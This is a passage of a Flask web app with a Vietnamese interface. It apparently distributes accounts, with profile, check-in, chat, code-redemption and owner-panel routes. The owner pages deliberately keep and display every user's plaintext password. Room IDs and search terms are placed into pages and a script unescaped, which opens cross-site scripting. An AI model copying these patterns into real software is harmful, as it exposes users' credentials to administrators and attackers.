        <div class="info-row"><span class="info-label">Level</span><span class="info-value">{user.get('level', 1)} (EXP {user.get('exp', 0)})</span></div>
        <div class="info-row"><span class="info-label">Đã mời</span><span class="info-value">{user.get('referrals', 0)}</span></div>
    </div>
    <div class="card"><h2 class="card-title">★ Kho Acc</h2>
        <div class="stat-grid-4">
            <a href="/history?tab=sss" class="stat-box small" style="text-decoration:none;"><div class="stat-value">{counts['sss']}</div><div class="stat-label">◈ SSS</div></a>
            <a href="/history?tab=ss" class="stat-box small" style="text-decoration:none;"><div class="stat-value">{counts['ss']}</div><div class="stat-label">◆ SS</div></a>
            <a href="/history?tab=anime" class="stat-box small" style="text-decoration:none;"><div class="stat-value">{counts['anime']}</div><div class="stat-label">◇ Anime</div></a>
            <a href="/history?tab=trang" class="stat-box small" style="text-decoration:none;"><div class="stat-value">{counts['trang']}</div><div class="stat-label">○ Trắng</div></a>
        </div>
        <a href="/export_vip_all" class="btn btn-success btn-block" style="margin-top:14px;">📥 XUẤT VIP ALL</a>
    </div>
    <div class="card"><h2 class="card-title">🔑 Đổi Mật Khẩu</h2>
        <a href="/my/change" class="btn btn-warning btn-block">🔐 Đổi MK Cá Nhân (OTP qua Tin nhắn)</a>
    </div>
    <div class="card"><h2 class="card-title">◉ Điểm Danh</h2>
        <div class="info-row"><span class="info-label">Trạng thái</span><span class="info-value">{ci_status}</span></div>
        <div class="info-row"><span class="info-label">Phần thưởng</span><span class="info-value">+{DAILY_REWARD} xu</span></div>
        <form method="POST" action="/daily" style="margin-top:14px;">
            <button type="submit" class="btn btn-success btn-block" {"disabled" if not can_checkin else ""}>{"✓ Điểm Danh" if can_checkin else "◷ Đã Điểm Danh"}</button></form>
    </div>
    <div class="card"><h2 class="card-title">🚪 Đăng Xuất</h2>
        <a href="/logout" class="btn btn-danger btn-block" onclick="return confirm('Đăng xuất?');">⎋ Đăng Xuất</a>
    </div>'''
    return render_page(content, active_tab="profile", user=user)

@app.route("/daily", methods=["POST"])
@login_required
def daily():
    user = get_user()
    now = time.time()
    if now - user.get("last_checkin", 0) < 86400: flash("Đã điểm danh hôm nay!", "error")
    else:
        user["balance"] += DAILY_REWARD; user["last_checkin"] = now
        save_data(); flash(f"+{DAILY_REWARD} xu!", "success")
    return redirect(url_for("profile"))

# ========== ENTER CODE ==========
@app.route("/enter_code", methods=["GET", "POST"])
@login_required
def enter_code():
    user = get_user()
    if request.method == "POST":
        code = request.form.get("code", "").strip().upper()
        if code in GENERATED_KEYS:
            k = GENERATED_KEYS[code]
            if k["remaining_uses"] > 0:
                k["remaining_uses"] -= 1
                user["balance"] = user.get("balance", 0) + k["check_count"]
                if k["remaining_uses"] <= 0: del GENERATED_KEYS[code]
                save_data(); flash(f"+{k['check_count']} lượt!", "success")
            else: flash("Code hết lượt!", "error")
        else: flash("Code không hợp lệ!", "error")
        return redirect(url_for("enter_code"))
    content = '''<div class="card"><h2 class="card-title">◆ Nhập Code</h2><form method="POST">
        <div class="form-group"><label class="form-label">Mã Code</label>
            <input type="text" name="code" class="form-input" required style="text-transform:uppercase;"></div>
        <button type="submit" class="btn btn-success btn-block">Xác Nhận</button></form></div>'''
    return render_page(content, active_tab="code", user=user)

# ========== CHAT ==========
def save_chat():
    try:
        with _chat_lock:
            data = {"messages": CHAT_MESSAGES[-CHAT_MAX_MESSAGES:]}
        with open(CHAT_FILE + ".tmp", "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False)
        os.replace(CHAT_FILE + ".tmp", CHAT_FILE)
    except Exception as e:
        logger.error(f"Save chat: {e}")

def load_chat():
    global CHAT_MESSAGES
    if not os.path.exists(CHAT_FILE): return
    try:
        with open(CHAT_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        CHAT_MESSAGES = data.get("messages", [])
    except Exception as e:
        logger.error(f"Load chat: {e}")

def chat_rate_ok(username):
    now = time.time()
    if now - _user_last_msg.get(username, 0) < CHAT_RATE_LIMIT_SEC: return False
    _user_last_msg[username] = now
    return True

def add_chat_message(room_id, sender, content):
    if not content or len(content) > CHAT_MAX_LENGTH: return None
    msg = {"id": uuid.uuid4().hex[:10], "room_id": room_id, "sender": sender,
           "content": content[:CHAT_MAX_LENGTH],
           "timestamp": time.time(),
           "time": datetime.now().strftime("%H:%M:%S")}
    with _chat_lock:
        CHAT_MESSAGES.append(msg)
        if len(CHAT_MESSAGES) > CHAT_MAX_MESSAGES: CHAT_MESSAGES.pop(0)
    return msg

def get_room_messages(room_id, limit=100, since_ts=0):
    with _chat_lock:
        msgs = [m for m in CHAT_MESSAGES if m.get("room_id") == room_id]
    if since_ts > 0:
        msgs = [m for m in msgs if m.get("timestamp", 0) > since_ts]
    return msgs[-limit:]

def get_all_rooms_for_user(username):
    rooms = [{"id": "public", "name": "🌐 Phòng chung", "type": "public"},
             {"id": f"support:{username}", "name": "🆘 Tin nhắn riêng", "type": "support"}]
    if is_owner(username) or is_qtv(username):
        rooms.append({"id": "admin", "name": "👑 Phòng QTV", "type": "admin"})
    return rooms

def get_unread_chat(username, room_id):
    u = USERS.get(username)
    if not u: return 0
    lr = u.get("chat_last_read", {}).get(room_id, 0)
    msgs = get_room_messages(room_id, limit=500)
    return sum(1 for m in msgs if m.get("timestamp", 0) > lr and m.get("sender") != username)

@app.route("/chat")
@login_required
def chat_home():
    user = get_user()
    rooms = get_all_rooms_for_user(user["username"])
    html = ""
    for r in rooms:
        unread = get_unread_chat(user["username"], r["id"])
        badge = f'<span class="chat-unread">{unread}</span>' if unread > 0 else ""
        html += f'<a href="/chat/{r["id"]}" class="list-item" style="text-decoration:none;"><div style="flex:1;"><div style="font-weight:700;">{r["name"]}</div><div style="font-size:0.72em; color:var(--text-mute);">{r["type"].upper()}</div></div>{badge}<div style="color:var(--text-mute);">›</div></a>'
    content = f'<div class="card"><h2 class="card-title">💬 Tin Nhắn</h2><div style="display:flex; flex-direction:column; gap:10px;">{html}</div></div>'
    return render_page(content, active_tab="chat", user=user)

@app.route("/chat/<path:room_id>")
@login_required
def chat_room(room_id):
    user = get_user()
    username = user["username"]
    if room_id == "admin" and not (is_owner(username) or is_qtv(username)):
        flash("Chỉ QTV!", "error"); return redirect(url_for("chat_home"))
    if room_id.startswith("support:"):
        ow = room_id.split(":", 1)[1]
        if ow != username and not is_owner(username):
            flash("Không có quyền!", "error"); return redirect(url_for("chat_home"))
    if "chat_last_read" not in user: user["chat_last_read"] = {}
    user["chat_last_read"][room_id] = time.time()
    save_data()
    rn = {"public": "🌐 Phòng chung", "admin": "👑 Phòng QTV"}
    rname = "🆘 Tin nhắn riêng" if room_id.startswith("support:") else rn.get(room_id, room_id)
    content = f'''<div class="card" style="padding:14px;">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
            <a href="/chat" class="btn btn-secondary btn-sm">←</a>
            <h2 class="card-title" style="margin:0; font-size:1em;">{rname}</h2>
            <div style="width:40px;"></div>
        </div>
        <div id="chat-box" class="chat-box"><div style="text-align:center; color:var(--text-mute); padding:20px;">Đang tải...</div></div>
        <div class="chat-input-row">
            <input type="text" id="chat-input" class="form-input" placeholder="Nhập tin nhắn..." maxlength="2000">
            <button onclick="sendMsg()" class="btn" style="padding:14px 18px;">➤</button>
        </div>
    </div>
    <script>
    var roomId = "{room_id}";
    var lastTs = 0;
    var myName = "{username}";
    function loadMessages() {{
        fetch('/api/chat/messages/' + encodeURIComponent(roomId) + '?since=' + lastTs)
        .then(r => r.json())
        .then(data => {{
            if (data.error) return;
            var box = document.getElementById('chat-box');
            if (data.messages && data.messages.length > 0) {{
                if (lastTs === 0) box.innerHTML = '';
                data.messages.forEach(m => {{
                    lastTs = Math.max(lastTs, m.timestamp);
                    var isMe = m.sender === myName;
                    var isSys = m.sender === 'SYSTEM';
                    var div = document.createElement('div');
                    div.className = 'chat-msg ' + (isSys ? 'system' : (isMe ? 'me' : 'other'));
                    div.innerHTML = '<div class="chat-meta">' + (isMe ? 'Bạn' : m.sender) + ' ' + (m.role_badge || '') + ' · ' + m.time + '</div><div class="chat-content">' + escapeHtml(m.content).replace(/\\n/g, '<br>') + '</div>';
                    box.appendChild(div);
                }});
                box.scrollTop = box.scrollHeight;
            }} else if (lastTs === 0) {{
                box.innerHTML = '<div style="text-align:center; color:var(--text-mute); padding:20px;">Chưa có tin nhắn</div>';
            }}
        }}).catch(e => console.log(e));
    }}
    function escapeHtml(t) {{ var d = document.createElement('div'); d.textContent = t; return d.innerHTML; }}
    function sendMsg() {{
        var inp = document.getElementById('chat-input');
        var txt = inp.value.trim();
        if (!txt) return;
        inp.value = '';
        fetch('/api/chat/send/' + encodeURIComponent(roomId), {{
            method: 'POST', headers: {{'Content-Type': 'application/json'}},
            body: JSON.stringify({{content: txt}})
        }}).then(r => r.json()).then(d => {{ if (d.error) alert(d.error); else loadMessages(); }});
    }}
    document.getElementById('chat-input').addEventListener('keypress', function(e) {{ if (e.key === 'Enter') sendMsg(); }});
    loadMessages();
    setInterval(loadMessages, 2000);
    </script>'''
    return render_page(content, active_tab="chat", user=user)

@app.route("/api/chat/messages/<path:room_id>")
@login_required
def api_chat_messages(room_id):
    user = get_user()
    username = user["username"]
    if room_id == "admin" and not (is_owner(username) or is_qtv(username)):
        return jsonify({"error": "no"})
    if room_id.startswith("support:"):
        ow = room_id.split(":", 1)[1]
        if ow != username and not is_owner(username):
            return jsonify({"error": "no"})
    since = float(request.args.get("since", 0))
    msgs = get_room_messages(room_id, limit=100, since_ts=since)
    out = []
    for m in msgs:
        sender = m.get("sender", "")
        if sender == "SYSTEM":
            ow = room_id.split(":", 1)[1] if room_id.startswith("support:") else ""
            if ow != username and not is_owner(username):
                continue
            out.append({"sender": "SYSTEM", "content": m.get("content"),
                        "time": m.get("time"), "timestamp": m.get("timestamp"),
                        "role_badge": ""})
            continue
        bt, bc = get_role_badge(sender)
        out.append({"sender": sender, "content": m.get("content"),
                    "time": m.get("time"), "timestamp": m.get("timestamp"),
                    "role_badge": f'<span style="color:{bc}; font-size:0.7em;">{bt}</span>' if (is_owner(sender) or is_qtv(sender)) else ''})
    return jsonify({"messages": out})

@app.route("/api/chat/send/<path:room_id>", methods=["POST"])
@login_required
def api_chat_send(room_id):
    user = get_user()
    username = user["username"]
    if room_id == "admin" and not (is_owner(username) or is_qtv(username)):
        return jsonify({"error": "no"})
    if room_id.startswith("support:"):
        ow = room_id.split(":", 1)[1]
        if ow != username and not is_owner(username):
            return jsonify({"error": "no"})
    if not chat_rate_ok(username): return jsonify({"error": "Chậm thôi!"})
    data = request.get_json(silent=True) or {}
    content = (data.get("content") or "").strip()
    if not content: return jsonify({"error": "Trống"})
    if room_id.startswith("support:") and not is_owner(username):
        room_id = f"support:{username}"
    msg = add_chat_message(room_id, username, content)
    if not msg: return jsonify({"error": "Lỗi"})
    if room_id.startswith("support:") and not (is_owner(username) or is_qtv(username)):
        NOTIFICATIONS.append({"id": uuid.uuid4().hex[:10],
            "title": f"💬 Tin từ {username}", "content": content[:200],
            "admin": username, "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            "timestamp": time.time()})
    threading.Thread(target=save_chat, daemon=True).start()
    return jsonify({"ok": True})

# ========== OWNER PANEL ==========
@app.route("/owner")
@owner_required
def owner_panel():
    return redirect(url_for("owner_users"))

@app.route("/owner/users")
@owner_required
def owner_users():
    user = get_user()
    keyword = request.args.get("q", "").strip().lower()
    all_users = list(USERS.values())
    if keyword:
        all_users = [u for u in all_users
                     if keyword in u.get("username", "").lower()
                     or keyword in u.get("id", "").lower()
                     or keyword in u.get("tag_code", "").lower()
                     or keyword in u.get("nickname", "").lower()]
    rows = ""
    for u in all_users:
        un = u.get("username", "")
        pw = u.get("plain_password", "")
        pw_d = f'<span style="color:#00ff88; font-family:monospace;">{pw}</span>' if pw else '[hash]'
        role, role_color = "👤 USER", "#8b8b9a"
        if u.get("is_owner"): role, role_color = "🥇 OWNER", "#ffb800"
        elif u.get("is_qtv"): role, role_color = "👑 QTV", "#00f0ff"
        ban_mark = " 🚫" if un in BANNED_USERS else ""
        dl = u.get("daily_limit", USER_DAILY_LIMIT)
        dl_disp = "∞" if dl == -1 else str(dl)
        rows += f'''<div class="list-item" style="flex-wrap:wrap;">
            <div style="flex:1; min-width:180px;">
                <div><span style="color:{role_color}; font-weight:800; font-size:0.8em;">{role}</span> <span style="font-family:monospace; font-weight:700;">{un}</span>{ban_mark}</div>
                <div style="font-size:0.72em; color:var(--text-mute);">ID: {u.get("id","?")} · Lv{u.get("level",1)} · 🎯 {dl_disp}/ngày · 🏷️ {u.get("tag_code","")}</div>
                <div style="font-size:0.8em; margin-top:4px;">🔑 {pw_d}</div>
            </div>
            <div style="display:flex; gap:4px; flex-wrap:wrap;">
                <a href="/owner/view_user/{un}" class="btn btn-sm btn-info">👁</a>
                <a href="/owner/set_limit/{un}" class="btn btn-sm btn-success">🎯 Set</a>
                <a href="/owner/add_limit/{un}" class="btn btn-sm" style="background:linear-gradient(135deg,#a855f7,#7c3aed); color:#fff;">➕ Lượt</a>
                <a href="/owner/change_creds/{un}" class="btn btn-sm btn-warning">🔑</a>
            </div></div>'''
    if not rows: rows = '<p style="text-align:center; color:var(--text-dim);">Không có user</p>'
    content = f'''<div class="card">
        <h2 class="card-title" style="color:#ffb800;">🥇 QUẢN LÝ USER</h2>
        <form method="GET" style="margin-bottom:14px;"><div style="display:flex; gap:8px;">
            <input type="text" name="q" class="form-input" placeholder="🔍 Tìm username / ID / Tag..." value="{keyword}">
            <button type="submit" class="btn">🔍</button>
            {"<a href='/owner/users' class='btn btn-secondary'>✕</a>" if keyword else ""}
        </div></form>
        <div class="stat-grid-3">
            <div class="stat-box"><div class="stat-value">{len(USERS)}</div><div class="stat-label">User</div></div>
            <div class="stat-box"><div class="stat-value">{sum(1 for u in USERS.values() if u.get("is_qtv"))}</div><div class="stat-label">QTV</div></div>
            <div class="stat-box"><div class="stat-value">{len(BANNED_USERS)}</div><div class="stat-label">Banned</div></div>
        </div>
        <div style="display:flex; gap:8px; margin-top:14px;">
            <a href="/owner/admins" class="btn btn-info btn-block" style="flex:1;">👑 QTV</a>
        </div>
    </div>
    <div class="card"><h3 class="card-title">📋 Danh sách ({len(all_users)})</h3>{rows}</div>'''
    return render_page(content, active_tab="", user=user)

@app.route("/owner/admins")
@owner_required
def owner_admins():
    user = get_user()
    sp = [u for u in USERS.values() if u.get("is_qtv") or u.get("is_owner")]
    rows = ""
    for u in sp:
        un = u.get("username", "")
        iow = u.get("is_owner", False)
        iq = u.get("is_qtv", False)
        dis = "disabled" if un == OWNER_USERNAME else ""
        role = "🥇 OWNER" if iow else "👑 QTV"
        pw = u.get("plain_password", "")
        rows += f'''<div class="card" style="padding:14px;">
            <div style="display:flex; justify-content:space-between; flex-wrap:wrap; gap:8px;">
                <div>
                    <div style="font-family:Orbitron; font-weight:800; color:#ffb800;">{role}</div>
                    <div style="font-family:monospace; font-size:1.05em; margin:4px 0;">{un}</div>
                    <div style="font-size:0.8em;">🔑 <span style="color:#00ff88; font-family:monospace;">{pw}</span></div>
                    <div style="font-size:0.72em; color:var(--text-mute);">🏷️ {u.get("tag_code","")}</div>
                </div>
                <div style="display:flex; flex-direction:column; gap:6px; min-width:180px;">
                    <label style="display:flex; align-items:center; gap:6px; font-size:0.82em;">
                        <input type="checkbox" {"checked" if iq else ""} {dis} onchange="setRole('{un}','is_qtv',this.checked)"> QTV</label>
                    <label style="display:flex; align-items:center; gap:6px; font-size:0.82em;">
                        <input type="checkbox" {"checked" if iow else ""} {dis} onchange="setRole('{un}','is_owner',this.checked)"> Owner</label>
                    <a href="/owner/change_creds/{un}" class="btn btn-sm btn-warning">🔑 Đổi TK/MK (không OTP)</a>
                </div></div></div>'''
    if not rows: rows = '<p style="text-align:center; color:var(--text-dim);">Chưa có QTV</p>'
    content = f'''<div class="card">
        <a href="/owner/users" class="btn btn-secondary btn-sm" style="margin-bottom:12px;">← User</a>
        <h2 class="card-title" style="color:#ffb800;">🥇 QUẢN LÝ QTV / OWNER</h2>
        <p style="color:var(--text-dim); font-size:0.85em;">⚠️ Chỉ OWNER mới set quyền. Không thể tự hạ Owner.</p>
    </div>{rows}
    <script>
    function setRole(u, f, v) {{
        fetch("/owner/set_role", {{ method:"POST", headers:{{"Content-Type":"application/json"}},
            body: JSON.stringify({{username:u, field:f, value:v}}) }})
        .then(r => r.json()).then(d => {{ if (d.error) {{ alert(d.error); location.reload(); }}
            else showToast("✓ Đã cập nhật " + f); }});
    }}
    </script>'''
    return render_page(content, active_tab="", user=user)

@app.route("/owner/set_role", methods=["POST"])
@owner_required
def owner_set_role():
    data = request.get_json(silent=True) or {}
    un = data.get("username", "")
    f = data.get("field", "")
    v = bool(data.get("value", False))
    if f not in ("is_qtv", "is_owner"): return jsonify({"error": "Field sai"})
    if un not in USERS: return jsonify({"error": "User không tồn tại"})
    if un == OWNER_USERNAME and f == "is_owner" and not v:
        return jsonify({"error": "Không thể tự hạ Owner!"})
    old = USERS[un].get(f, False)
    USERS[un][f] = v
    invalidate_user_sessions(un)
    log_admin("SET_ROLE", un, f"{f}: {old}→{v}")
    save_data(force=True)
    return jsonify({"ok": True})

@app.route("/owner/set_limit/<username>", methods=["GET", "POST"])
@owner_required
def owner_set_limit(username):
    user = get_user()
    if username not in USERS:
        flash("User không tồn tại!", "error"); return redirect(url_for("owner_users"))
    t = USERS[username]
    if request.method == "POST":
        try: new_limit = int(request.form.get("limit", USER_DAILY_LIMIT))
        except: flash("Số không hợp lệ!", "error"); return redirect(url_for("owner_set_limit", username=username))
        if new_limit < -1:
            flash("Limit tối thiểu = -1 (unlimited)", "error")
            return redirect(url_for("owner_set_limit", username=username))
        t["daily_limit"] = new_limit
        log_admin("SET_LIMIT", username, f"limit={new_limit}")
        save_data(force=True)
        limit_txt = "∞ UNLIMITED" if new_limit == -1 else f"{new_limit} lượt/ngày"
        notify = f"🔔 LƯỢT NHẬN ACC ĐÃ ĐƯỢC CẬP NHẬT\n└─ Bạn có: {limit_txt}"
        add_chat_message(f"support:{username}", "SYSTEM", notify)
        threading.Thread(target=save_chat, daemon=True).start()
        flash(f"✅ Đã set {limit_txt} cho {username}", "success")
        return redirect(url_for("owner_users"))
    current = t.get("daily_limit", USER_DAILY_LIMIT)
    current_txt = "∞ UNLIMITED" if current == -1 else f"{current} lượt/ngày"
    content = f'''<div class="card">
        <div style="display:flex; justify-content:space-between; margin-bottom:14px;">
            <a href="/owner/users" class="btn btn-secondary btn-sm">← Quay lại</a>
            <h2 class="card-title" style="margin:0;">🎯 SET LƯỢT NHẬN ACC</h2>
        </div>
        <div class="info-row"><span class="info-label">User</span><span class="info-value" style="font-family:monospace;">{username}</span></div>
        <div class="info-row"><span class="info-label">Limit hiện tại</span><span class="info-value" style="color:#ffb800; font-weight:800;">{current_txt}</span></div>
        <div class="info-row"><span class="info-label">Mặc định</span><span class="info-value">{USER_DAILY_LIMIT} lượt/ngày</span></div>
    </div>
    <div class="card">
        <h3 class="card-title">🔧 Chọn Limit Mới</h3>
        <form method="POST">
            <div class="form-group"><label class="form-label">Số lượt/ngày</label>
                <input type="number" name="limit" class="form-input" value="{current}" min="-1" required>
                <p style="color:var(--text-dim); font-size:0.8em; margin-top:6px;">
                    💡 Gợi ý: <b>{USER_DAILY_LIMIT}</b> = mặc định · <b>50</b> = VIP · <b>999</b> = Siêu VIP · <b>-1</b> = Unlimited
                </p>
            </div>
            <div style="display:flex; gap:8px; margin-bottom:14px; flex-wrap:wrap;">
                <button type="submit" name="limit" value="{USER_DAILY_LIMIT}" class="btn btn-secondary btn-sm">{USER_DAILY_LIMIT} (Mặc định)</button>
                <button type="submit" name="limit" value="50" class="btn btn-info btn-sm">50 (VIP)</button>
                <button type="submit" name="limit" value="999" class="btn btn-warning btn-sm">999 (Siêu VIP)</button>
                <button type="submit" name="limit" value="-1" class="btn btn-success btn-sm">∞ Unlimited</button>
            </div>
            <button type="submit" class="btn btn-block">✅ Xác Nhận Set</button>
        </form>
    </div>'''
    return render_page(content, active_tab="", user=user)

@app.route("/owner/add_limit/<username>", methods=["GET", "POST"])
@owner_required
def owner_add_limit(username):
    user = get_user()
    if username not in USERS:
        flash("User không tồn tại!", "error"); return redirect(url_for("owner_users"))
    t = USERS[username]
    if request.method == "POST":
        try: amt = int(request.form.get("amount", 0))
        except: flash("Số không hợp lệ!", "error"); return redirect(url_for("owner_add_limit", username=username))
        current = t.get("daily_limit", USER_DAILY_LIMIT)
        new_limit = current + amt
        if new_limit < -1: new_limit = -1
        t["daily_limit"] = new_limit
        log_admin("ADD_LIMIT", username, f"{current}→{new_limit}")
        save_data(force=True)
        limit_txt = "∞ UNLIMITED" if new_limit == -1 else f"{new_limit} lượt/ngày"
        notify = (f"🎁 LƯỢT NHẬN ACC ĐÃ CẬP NHẬT\n"
                  f"├─ Trước: {current if current >= 0 else '∞'}\n"
                  f"├─ Thay đổi: {'+' if amt >= 0 else ''}{amt}\n"
                  f"└─ Hiện tại: {limit_txt}")
        add_chat_message(f"support:{username}", "SYSTEM", notify)
        threading.Thread(target=save_chat, daemon=True).start()
        flash(f"✅ Đã {amt:+d} lượt cho {username}. Limit mới: {limit_txt}", "success")
        return redirect(url_for("owner_users"))
    current = t.get("daily_limit", USER_DAILY_LIMIT)
    current_txt = "∞ UNLIMITED" if current == -1 else f"{current} lượt/ngày"
    content = f'''<div class="card">
        <div style="display:flex; justify-content:space-between; margin-bottom:14px;">
            <a href="/owner/users" class="btn btn-secondary btn-sm">← Quay lại</a>
            <h2 class="card-title" style="margin:0;">🎁 CỘNG LƯỢT NHẬN ACC</h2>
        </div>
        <div class="info-row"><span class="info-label">User</span><span class="info-value" style="font-family:monospace;">{username}</span></div>
        <div class="info-row"><span class="info-label">Limit hiện tại</span><span class="info-value" style="color:#ffb800; font-weight:800;">{current_txt}</span></div>
    </div>
    <div class="card">
        <h3 class="card-title">➕ Cộng lượt nhanh</h3>
        <form method="POST">
            <div class="form-group"><label class="form-label">Số lượt cộng (+/-)</label>
                <input type="number" name="amount" class="form-input" value="10" required>
                <p style="color:var(--text-dim); font-size:0.8em; margin-top:6px;">
                    💡 Nhập số dương để cộng, âm để trừ. VD: 10, 50, 100, -5
                </p>
            </div>
            <div style="display:flex; gap:8px; margin-bottom:14px; flex-wrap:wrap;">
                <button type="submit" name="amount" value="10" class="btn btn-success btn-sm">+10</button>
                <button type="submit" name="amount" value="50" class="btn btn-info btn-sm">+50</button>
                <button type="submit" name="amount" value="100" class="btn btn-warning btn-sm">+100</button>
                <button type="submit" name="amount" value="999" class="btn btn-danger btn-sm">+999</button>
            </div>
            <button type="submit" class="btn btn-block">✅ Xác Nhận</button>
        </form>
    </div>'''
    return render_page(content, active_tab="", user=user)

@app.route("/owner/change_creds/<username>", methods=["GET", "POST"])
@owner_required
def owner_change_creds(username):
    user = get_user()
    if username not in USERS:
        flash("User không tồn tại!", "error"); return redirect(url_for("owner_users"))
    t = USERS[username]
    if request.method == "POST":
        nu = request.form.get("new_username", "").strip()
        np_ = request.form.get("new_password", "").strip()
        changed = False
        if nu and nu != username:
            if nu in USERS:
                flash("Username mới đã tồn tại!", "error")
                return redirect(url_for("owner_change_creds", username=username))
            t["username"] = nu
            USERS[nu] = USERS.pop(username)
            invalidate_user_sessions(nu)
            username = nu
            changed = True
            flash(f"✅ Đổi username → {nu}", "success")
        if np_:
            t["password"] = hash_password(np_)
            t["plain_password"] = np_
            invalidate_user_sessions(t.get("username", username))
            changed = True
            flash("✅ Đổi password thành công", "success")
        if changed:
            t["force_logout_reason"] = "Admin đã đổi thông tin tài khoản. Vui lòng đăng nhập lại!"
            log_admin("CHANGE_CREDS", username, "OK (no OTP)")
            save_data(force=True)
            notify = (f"🔔 TÀI KHOẢN CỦA BẠN ĐÃ ĐƯỢC CẬP NHẬT\n"
                      f"├─ User: {username}\n"
                      f"├─ MK mới: {np_ if np_ else '(giữ nguyên)'}\n"
                      f"└─ Vui lòng đăng nhập lại!")
            add_chat_message(f"support:{username}", "SYSTEM", notify)
            threading.Thread(target=save_chat, daemon=True).start()
        return redirect(url_for("owner_users"))
    pw = t.get("plain_password", "")
    content = f'''<div class="card">
        <div style="display:flex; justify-content:space-between; margin-bottom:14px;">
            <a href="/owner/admins" class="btn btn-secondary btn-sm">← Quay lại</a>
            <h2 class="card-title" style="margin:0;">🔑 ĐỔI TK/MK</h2>
        </div>
        <div class="info-row"><span class="info-label">User</span><span class="info-value" style="font-family:monospace;">{username}</span></div>
        <div class="info-row"><span class="info-label">MK hiện tại</span><span class="info-value" style="color:#00ff88; font-family:monospace;">{pw or "[hash]"}</span></div>
        <div class="info-row"><span class="info-label">🏷️ Tag</span><span class="info-value" style="font-family:monospace;">{t.get("tag_code","")}</span></div>
    </div>
    <div class="card">
        <h3 class="card-title" style="color:#00ff88;">🔓 Đổi TRỰC TIẾP (KHÔNG cần OTP)</h3>
        <form method="POST">
            <div class="form-group"><label class="form-label">Username mới (bỏ trống nếu không đổi)</label>
                <input type="text" name="new_username" class="form-input" placeholder="{username}"></div>
            <div class="form-group"><label class="form-label">Password mới (bỏ trống nếu không đổi)</label>
                <input type="text" name="new_password" class="form-input" placeholder="MK mới"></div>
            <button type="submit" class="btn btn-success btn-block">🔐 ĐỔI NGAY</button>
        </form>
    </div>
    <div class="card" style="border:1px solid #ff8800;">
        <p style="color:#ff8800; font-size:0.85em;">⚠️ Khi đổi, user <b>{username}</b> đang online sẽ bị <b>văng ngay</b>. Hệ thống tự gửi tin nhắn thông báo cho user.</p>
    </div>'''
    return render_page(content, active_tab="", user=user)

@app.route("/owner/view_user/<username>")
@owner_required
def owner_view_user(username):
    user = get_user()
    if username not in USERS:
        flash("User không tồn tại!", "error"); return redirect(url_for("owner_users"))
    u = USERS[username]
    pw = u.get("plain_password", "")
    pw_html = f'<span style="color:#00ff88; font-family:monospace; font-size:1.2em;">{pw}</span>' if pw else '<span style="color:#ff8800;">[Không lưu plain]</span>'
    role = "👤 USER"
    if u.get("is_owner"): role = "🥇 OWNER"
    elif u.get("is_qtv"): role = "👑 QTV"
    dl = u.get("daily_limit", USER_DAILY_LIMIT)
    dl_disp = "∞" if dl == -1 else str(dl)
    content = f'''<div class="card">
        <div style="display:flex; justify-content:space-between; margin-bottom:14px;">
            <a href="/owner/users" class="btn btn-secondary btn-sm">← Quay lại</a>
            <h2 class="card-title" style="margin:0;">👁 CHI TIẾT USER</h2>
        </div>
        <div class="info-row"><span class="info-label">Role</span><span class="info-value">{role}</span></div>
        <div class="info-row"><span class="info-label">Username</span><span class="info-value" style="font-family:monospace;">{username}</span></div>
        <div class="info-row"><span class="info-label">Password (plain)</span><span class="info-value">{pw_html}</span></div>
        <div class="info-row"><span class="info-label">Password Hash</span><span class="info-value" style="font-family:monospace; font-size:0.7em; word-break:break-all;">{u.get("password","")}</span></div>
        <div class="info-row"><span class="info-label">🏷️ Tag</span><span class="info-value" style="font-family:monospace;">{u.get("tag_code","")}</span></div>
        <div class="info-row"><span class="info-label">ID</span><span class="info-value" style="font-family:monospace;">{u.get("id","")}</span></div>
        <div class="info-row"><span class="info-label">Balance</span><span class="info-value">{u.get("balance",0)} xu</span></div>
        <div class="info-row"><span class="info-label">🎯 Lượt nhận/ngày</span><span class="info-value" style="color:#00ff88; font-weight:800;">{dl_disp}</span></div>
        <div class="info-row"><span class="info-label">Level</span><span class="info-value">Lv{u.get("level",1)}</span></div>
        <div class="info-row"><span class="info-label">Banned</span><span class="info-value">{"🚫 CÓ" if username in BANNED_USERS else "✅ Không"}</span></div>
    </div>'''
    return render_page(content, active_tab="", user=user)

# ========== ĐỔI MK CÁ NHÂN ==========
@app.route("/my/change", methods=["GET", "POST"])
@login_required
def my_change_creds():
    user = get_user()
    username = user["username"]
    if is_owner(username):
        flash("Owner dùng /owner để đổi!", "error"); return redirect(url_for("profile"))
    if request.args.get("resend") == "1" and session.get("otp_pending") == username:
        otp = gen_otp(username, "self_change")
        otp_msg = (f"🔐 MÃ OTP MỚI (gửi lại)\n"
                   f"├─ Mã: {otp}\n"
                   f"├─ Hiệu lực: 5 phút\n"
                   f"└─ KHÔNG chia sẻ mã cho ai!")
        add_chat_message(f"support:{username}", "SYSTEM", otp_msg)
        threading.Thread(target=save_chat, daemon=True).start()
        flash("📱 Đã gửi lại mã OTP mới!", "success")
        return redirect(url_for("my_change_creds"))
    if request.method == "POST":
        step = request.form.get("step", "request")
        old_pw = request.form.get("old_password", "")
        if step == "request":
            if hash_password(old_pw) != user.get("password"):
                flash("Mật khẩu cũ không đúng!", "error")
                return redirect(url_for("my_change_creds"))
            otp = gen_otp(username, "self_change")
            otp_msg = (f"🔐 MÃ OTP ĐỔI MẬT KHẨU\n"
                       f"├─ Mã: {otp}\n"
                       f"├─ Hiệu lực: 5 phút\n"
                       f"└─ KHÔNG chia sẻ mã cho ai!")
            add_chat_message(f"support:{username}", "SYSTEM", otp_msg)
            threading.Thread(target=save_chat, daemon=True).start()
            session["otp_pending"] = username
            session["otp_sent_at"] = time.time()
            flash("📱 Đã gửi mã OTP vào TIN NHẮN. Vào Chat → 🆘 Tin nhắn riêng để xem!", "success")
            return redirect(url_for("my_change_creds"))
        elif step == "confirm":
            code = request.form.get("otp", "").strip()
            np_ = request.form.get("new_password", "").strip()
            ok, msg = verify_otp(username, code)
            if not ok:
                flash(f"❌ {msg}", "error"); return redirect(url_for("my_change_creds"))
            if len(np_) < 4:
                flash("MK mới phải >= 4 ký tự!", "error"); return redirect(url_for("my_change_creds"))
            user["password"] = hash_password(np_)
            user["plain_password"] = np_
            invalidate_user_sessions(username)
            save_data(force=True)
            session.pop("otp_pending", None)
            session.pop("otp_sent_at", None)
            flash("✅ Đổi MK thành công! Vui lòng đăng nhập lại.", "success")
